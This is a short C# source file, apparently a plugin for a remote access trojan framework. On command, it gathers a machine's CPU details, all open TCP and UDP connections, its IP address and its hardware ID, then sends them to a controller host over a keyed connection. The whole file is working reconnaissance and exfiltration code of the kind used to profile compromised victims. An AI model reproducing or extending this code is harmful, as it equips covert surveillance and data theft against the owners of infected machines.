using PacketLib;
using PacketLib.Packet;
using PacketLib.Utils;
using System.Collections.Generic;
using System.Threading;

/* 
|| AUTHOR Arsium ||
|| github : https://github.com/arsium       ||
*/

namespace Plugin
{
    public static class Launch
    {
        internal static Dictionary<string, List<string>> information;

        static Launch() 
        {
            information = new Dictionary<string, List<string>>();
        }

        public static void Main(LoadingAPI loadingAPI)
        {
            switch (loadingAPI.currentPacket.packetType)
            {
                case PacketType.MISC_INFORMATION:
                    information.Add("CPU", new List<string>());
                    information["CPU"].Add(HardwareInformation.CPU);
                    InformationPacket informationPacket = new InformationPacket(information, NetworkInformation.SocketConnectionIPV4.GetAllTcpConnections(), NetworkInformation.SocketConnectionIPV4.GetAllUdpConnections(), loadingAPI.baseIp, loadingAPI.HWID);
                    ClientSender(loadingAPI.host, loadingAPI.key, informationPacket);
                    break;

                default:
                    return;
            }
            Miscellaneous.CleanMemory();
        }

        private static void ClientSender(Host host, string key, IPacket packet)
        {
            ClientHandler clientHandler = new ClientHandler(host, key);
            clientHandler.ConnectStart();
            while (!clientHandler.Connected)
                Thread.Sleep(125);

            clientHandler.SendPacket(packet);
        }
    }
}
